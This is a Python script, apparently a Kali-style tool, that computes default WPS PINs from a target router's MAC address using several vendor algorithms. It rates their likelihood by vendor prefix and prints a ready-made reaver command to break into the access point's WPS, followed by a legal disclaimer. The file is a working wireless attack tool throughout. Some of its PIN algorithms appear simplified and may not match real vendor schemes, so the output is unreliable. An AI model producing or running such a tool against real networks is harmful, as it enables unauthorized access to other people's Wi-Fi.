#!/usr/bin/env python3
"""
WPSGEN PRO-V4.2.0
Specialized Wireless Security Research Tool for Kali Linux.

Author: AI Security Research Dept.
Version: 4.2.0
"""

import sys
import re
import argparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box

console = Console()

BANNER = """
[bold green]
 __      __________   _________  ________  ______  _____  
 \ \    / /  __ \ \ \ / /  ____||  ____\ \ / /|  __ \|  __ \ 
  \ \  / /| |__) \ \ V /| |__   | |__   \ V / | |__) | |__) |
   \ \/ / |  ___/   > < |  __|  |  __|   > <  |  ___/|  _  / 
    \  /  | |      / . \| |____ | |____ / . \ | |    | | \ \ 
     \/   |_|     /_/ \_\______|______/_/ \_\|_|    |_|  \_\
[/bold green]
[bold cyan]            WIRELESS SECURITY ENGINE // VERSION 4.2.0[/bold cyan]
"""

DISCLAIMER = """
[bold red]DISCLAIMER / LEGAL NOTICE:[/bold red]
[italic red]This tool is for educational purposes and authorized penetration testing only.
Usage of this script for attacking targets without prior mutual consent
is illegal. Developers assume no liability for misuse or damage caused.[/italic red]
"""

class WPSCore:
    def __init__(self, mac_address):
        self.mac = self.validate_mac(mac_address)
        if not self.mac:
            raise ValueError(f"Invalid MAC address format: [bold red]{mac_address}[/bold red]")
        
        self.mac_hex = self.mac.replace(':', '').upper()
        self.mac_int = int(self.mac_hex, 16)
        self.last_24 = self.mac_int & 0xFFFFFF
        self.oui = self.mac_hex[:6]

    @staticmethod
    def validate_mac(mac):
        clean = re.sub(r'[^a-fA-F0-9]', '', mac)
        if len(clean) == 12:
            return ':'.join(clean[i:i+2] for i in range(0, 12, 2)).upper()
        return None

    @staticmethod
    def checksum(pin):
        accum = 0
        t = pin
        while t > 0:
            accum += 3 * (t % 10)
            t //= 10
            accum += (t % 10)
            t //= 10
        return (10 - (accum % 10)) % 10

    def format_pin(self, pin_7):
        pin_str = f"{pin_7:07d}"
        chk = self.checksum(int(pin_str))
        return f"{pin_str}{chk}"

    def algo_zhao(self):
        return self.format_pin(self.last_24 % 10000000)

    def algo_dlink(self):
        return self.format_pin((self.last_24 ^ 0x55AA55) % 10000000)

    def algo_asus(self):
        return self.format_pin((self.last_24 ^ 0xFFFFFF) % 10000000)

    def algo_32bit(self):
        return self.format_pin(self.mac_int % 10000000)

    def get_vendor_info(self):
        vendors = {
            "001311": ("Edimax", "Zhao"),
            "107BEF": ("Tenda", "Zhao"),
            "C83A35": ("Tenda", "Zhao"),
            "001CF0": ("D-Link", "ComputePIN"),
            "002191": ("D-Link", "ComputePIN"),
            "14D64D": ("D-Link", "ComputePIN"),
            "F81A67": ("TP-Link", "32-bit"),
            "B85510": ("ASUS", "ASUS/Airocon"),
        }
        return vendors.get(self.oui, ("Unknown", "None"))

def main():
    console.print(BANNER)
    
    parser = argparse.ArgumentParser(description="WPSGEN PRO - WPS PIN Generator")
    parser.add_argument("mac", nargs="?", help="Target MAC Address")
    args = parser.parse_args()

    target_mac = args.mac
    if not target_mac:
        console.print("[bold yellow]Enter Target MAC Address:[/bold yellow] ", end="")
        target_mac = input()

    try:
        core = WPSCore(target_mac)
        vendor, suggestion = core.get_vendor_info()

        # Section 1: Target Analysis
        analysis_text = Text()
        analysis_text.append("BSSID: ", style="bold white")
        analysis_text.append(f"{core.mac}\n", style="bold cyan")
        analysis_text.append("VENDOR: ", style="bold white")
        analysis_text.append(f"{vendor}\n", style="bold green")
        analysis_text.append("OUI: ", style="bold white")
        analysis_text.append(f"{core.oui}", style="bold yellow")
        
        console.print(Panel(analysis_text, title="[bold white]SECTION 01: TARGET ANALYSIS[/bold white]", border_style="cyan", box=box.SQUARE))

        # Section 2: Calculated PINs
        table = Table(title="[bold white]SECTION 02: CALCULATED WPS PINS[/bold white]", box=box.SQUARE, border_style="green", header_style="bold green")
        table.add_column("ALGORITHM", style="dim")
        table.add_column("WPS PIN", justify="center", style="bold white")
        table.add_column("PROBABILITY", justify="right")

        table.add_row("Zhao (Standard)", core.algo_zhao(), "High" if suggestion == "Zhao" else "Med")
        table.add_row("ComputePIN (D-Link)", core.algo_dlink(), "High" if suggestion == "ComputePIN" else "Med")
        table.add_row("ASUS/Airocon", core.algo_asus(), "High" if suggestion == "ASUS/Airocon" else "Low")
        table.add_row("32-bit Integer", core.algo_32bit(), "Med" if suggestion == "32-bit" else "Low")

        console.print(table)

        # Section 3: Reaver Command
        top_pin = core.algo_zhao() if suggestion == "Zhao" else core.algo_dlink()
        cmd = f"reaver -i wlan0mon -b {core.mac} -p {top_pin} -vv -K 1"
        
        console.print(Panel(Text(cmd, style="bold cyan"), title="[bold white]SECTION 03: RECOMMENDED REAVER CMD[/bold white]", border_style="yellow", box=box.ROUNDED))

    except ValueError as e:
        console.print(f"[bold red]ERROR:[/bold red] {e}")
    except Exception as e:
        console.print(f"[bold red]CRITICAL FAILURE:[/bold red] {e}")

    # Footer
    console.print(Panel(DISCLAIMER, border_style="red", box=box.HEAVY))

if __name__ == "__main__":
    main()
